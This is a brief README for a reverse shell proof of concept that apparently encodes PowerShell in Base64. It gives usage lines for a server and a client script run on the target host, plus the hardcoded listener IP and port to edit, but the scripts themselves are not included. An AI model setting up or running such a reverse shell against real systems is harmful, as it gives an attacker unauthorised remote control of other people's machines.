PowerShell 2 B64 (Custom) - Reverse Shell PoC

Use a portable python interpreter like https://github.com/EdwardLab/binpython/releases/tag/0.46 to get the best results.

Run on the target host:

Uage: pyton3 server.py
Uage: python3 client.py

Hardcoded variables to change:
```
HOST = '192.168.1.67'  # The IP of the listener.
PORT = 446              # The same port as listener.
```

3/10/25 - LiquidSky (c) 2025
